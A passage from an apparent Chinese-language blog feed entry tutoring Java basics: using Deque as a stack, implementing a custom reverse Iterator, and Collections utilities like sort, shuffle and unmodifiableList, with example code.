class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="使用Stack"><a href="#使用Stack" class="headerlink" title="使用Stack"></a>使用Stack</h2><ul><li>栈（Stack）是一种后进先出（LIFO）的数据结构，操作栈的元素的方法有： <ul><li>把元素压栈：<code>push(E)</code>；</li><li>把栈顶的元素“弹出”：<code>pop(E)</code>；</li><li>取栈顶元素但不弹出：<code>peek(E)</code>。</li></ul></li></ul><p>在Java中，我们用<code>Deque</code>可以实现<code>Stack</code>的功能，注意只调用<code>push()</code>&#x2F;<code>pop()</code>&#x2F;<code>peek()</code>方法，避免调用<code>Deque</code>的其他方法。<br>最后，不要使用遗留类<code>Stack</code>。 </p><h2 id="使用Iterator"><a href="#使用Iterator" class="headerlink" title="使用Iterator"></a>使用Iterator</h2><ul><li><code>Iterator</code>是一种抽象的数据访问模型。使用<code>Iterator</code>模式进行迭代的好处有： <ul><li>对任何集合都采用同一种访问模型；</li><li>调用者对集合内部结构一无所知；</li><li>集合类返回的<code>Iterator</code>对象知道如何迭代。</li></ul></li></ul><p>Java提供了标准的迭代器模型，即集合类实现<code>java.util.Iterable</code>接口，返回<code>java.util.Iterator</code>实例 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">collectionIterator</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ReverseList&lt;String&gt; reverseList = <span class="keyword">new</span> ReverseList&lt;&gt;();</span><br><span class="line">        reverseList.add(<span class="string">&quot;Apple&quot;</span>);</span><br><span class="line">        reverseList.add(<span class="string">&quot;Orange&quot;</span>);</span><br><span class="line">        reverseList.add(<span class="string">&quot;Pear&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String string : reverseList)&#123;</span><br><span class="line">            System.out.println(string);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReverseList</span>&lt;<span class="title">T</span>&gt; <span class="keyword">implements</span> <span class="title">Iterable</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;T&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(T t)</span></span>&#123;</span><br><span class="line">        list.add(t);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Iterator&lt;T&gt; <span class="title">iterator</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ReverseIterator(list.size());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ReverseIterator</span> <span class="keyword">implements</span> <span class="title">Iterator</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">        ReverseIterator(<span class="keyword">int</span> index)&#123;</span><br><span class="line">            <span class="keyword">this</span>.index = index;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> index &gt; <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> T <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            index--;</span><br><span class="line">            <span class="keyword">return</span> ReverseList.<span class="keyword">this</span>.list.get(index);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用Collections"><a href="#使用Collections" class="headerlink" title="使用Collections"></a>使用Collections</h2><ul><li><code>Collections</code>类提供了一组工具方法来方便使用集合类： <ul><li>创建空集合；</li><li>创建单元素集合；</li><li>创建不可变集合；</li><li>排序／洗牌等操作。</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">collectionCollections</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        testCollections();</span><br><span class="line">        mutableCollections();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testCollections</span><span class="params">()</span></span>&#123;</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        list.add(<span class="string">&quot;apple&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;pear&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;orange&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(list);</span><br><span class="line"><span class="comment">//        排序</span></span><br><span class="line">        Collections.sort(list);</span><br><span class="line">        System.out.println(list);</span><br><span class="line"><span class="comment">//        随机顺序</span></span><br><span class="line">        Collections.shuffle(list);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mutableCollections</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------------&quot;</span>);</span><br><span class="line">        List&lt;String&gt; mutable = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        mutable.add(<span class="string">&quot;apple&quot;</span>);</span><br><span class="line">        mutable.add(<span class="string">&quot;pear&quot;</span>);</span><br><span class="line">        List&lt;String&gt; immutable = Collections.unmodifiableList(mutable);</span><br><span class="line">        mutable.add(<span class="string">&quot;orange&quot;</span>);</span><br><span class="line">        System.out.println(immutable);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Java基础学习</summary>
    
    
    
    <category term="JavaSecurity" scheme="https://pan3a.github.io/categories/JavaSecurity/"/>
    
    
  </entry>
  
</feed>
